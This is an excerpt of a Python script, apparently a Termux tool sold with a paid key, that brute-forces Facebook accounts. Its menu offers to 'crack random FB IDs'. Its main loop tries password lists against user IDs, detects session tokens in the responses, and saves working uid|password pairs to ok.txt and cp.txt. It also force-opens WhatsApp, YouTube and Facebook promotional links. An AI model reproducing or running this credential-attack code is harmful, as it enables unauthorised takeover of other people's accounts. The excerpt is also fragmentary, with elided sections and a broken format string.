...
def logo():
	print ("""
   _____  __      _____              _________   ___________________________   ___________ 
__  / / /________  /______ ______ ______  /   ______  /__    |__    |__  | / /__(_)__(_)
_  / / /__  ___/  __/  __ `/  __ `/  __  /    ___ _  /__  /| |_  /| |_   |/ /__  /__  / 
/ /_/ / _(__  )/ /_ / /_/ // /_/ // /_/ /     / /_/ / _  ___ |  ___ |  /|  / _  / _  /  
\____/  /____/ \__/ \__,_/ \__,_/ \__,_/      \____/  /_/  |_/_/  |_/_/ |_/  /_/  /_/   
...
def helpnote():
	...
	subprocess.check_output(["am", "start", "https://github.com/Suhhbat/TRICKER/blob/main/KING.txt"])
	#yahan apni facebook id link dalna
	exit(" [=>] https://www.facebook.com/profile.php?id=100091146524639")
...
def notice():
	...
	os.system("xdg-open https://chat.whatsapp.com/EvhN1de3Mk6Jbxr3Q1sIuZ")
	runtxt("\033[0;97m Key Approval ke Lai Group Jion Krein >> %s%s"%())
	runtxt("\033[0;97m Key group admin ke post pe coment krein")
	os.system("xdg-open https://chat.whatsapp.com/EvhN1de3Mk6Jbxr3Q1sIuZ")
	subprocess.check_output(["am", "start", "https://chat.whatsapp.com/EvhN1de3Mk6Jbxr3Q1sIuZ"])
...
class Main:
	def __init__(self):
		...
		try:
			...
			plr = requests.get('https://github.com/Suhhbat/TRICKER/blob/main/KING.txt').text
			if basesplit in plr:
				key = basesplit
				...
				key = ("\033[0;97m(10181AYTRIDFAE493A9D12202TSC3511210181)-")
				stat = ("\033[0;97mPAID")
				FY = '\033[0;90m'
				FG = '\033[0;90m'
...
\____/  /____/ \__/ \__,_/ \__,_/ \__,_/      \____/  /_/  |_/_/  |_/_/ |_/  /_/  /_/   
 ───────────────────────────────────────────────────────×
\t\033[1;97m[\x1b[1;97m\x1b[1;41m SUHBAT YT\x1b[0m\x1b[1;97m]
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Version : 2.0\x1b[0m\x1b[1;97m] \033[1;37m 
 ───────────────────────────────────────────────────────×
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Author   :""SUHBAT KING"" \x1b[0m\x1b[1;97m]
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Github   : https://github.com/Suhhbat/SUHBAT-AK\x1b[0m\x1b[1;97m]
\t\033[1;97m[\x1b[1;97m\x1b[1;41m Facebook : www.facebook./UstaadJanii\x1b[0m\x1b[1;97m]
───────────────────────────────────────────────────────× 
    """)
		print("%s [%s•%s] %sTOOL NAME : %sABRO KHAN"%(G,R,G,B,G))
		...
		subprocess.check_output(["am", "start", "https://youtube.com/@kingabro7775"])
		print("───────────────────────────────────────────────────────× ")
		print("%s [%s1%s]%s CRACK RANDOM FB ID 2009-11 {JUST NOW} %s(PAID Trail)"%(G,R,G,Y,B))
  ...
  'Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:79.0) Gecko/20100101 Firefox/79.0'
		...
		for pw in pwx:
			...
			if "session_key" in response.text and "EAAA" in response.text:
				print("\r  \033[0;97m   [=Janii=OK=>] %s | %s\033[0;97m         "%(uid, pw))
				self.ok.append("%s|%s"%(uid, pw))
				open("ok.txt","a").write("   [=Janii=OK=>]  %s|%s\n"%(uid, pw))
				break
			elif "www.facebook.com" in response.json()["error_msg"]:
				print("\r  \033[0;92m   [=Janii=CP=>] %s | %s\033[0;97m         "%(uid, pw))
				self.cp.append("%s|%s"%(uid, pw))
				open("cp.txt","a").write("   [=Janii=CP=>]  %s|%s\n"%(uid, pw))
				break
			else:
				continue

 #Janii copy krke apna name dal dyna
...
if len(sys.argv) == 2:
	if sys.argv[1] == "--info":
		...
		print("\n [*] Author = SUHBAT KING   :  ")
		print(" [*] Team    10  :  \n")
		print(" [ Sosial Medi [https://chat.whatsapp.com/EvhN1de3Mk6Jbxr3Q1sIuZ ] \n")
		print(" [*] Facebook  : https://facebook.com/https://www.facebook.com/profile.php?id=100091146524639")
		print(" [*] Instagram : https://instagram.com/https://www.instagram.com/p/CqXYMjPM0os/?igshid=YmMyMTA2M2Y= ")
		print(" [*] YouTube   : https://youtube.com/https://youtube.com/@kingabro7775")
		exit(" [*] GitHub    : https://github.com/https://github.com/Suhhbat/SUHBAT-AK")
	else:
		Main()
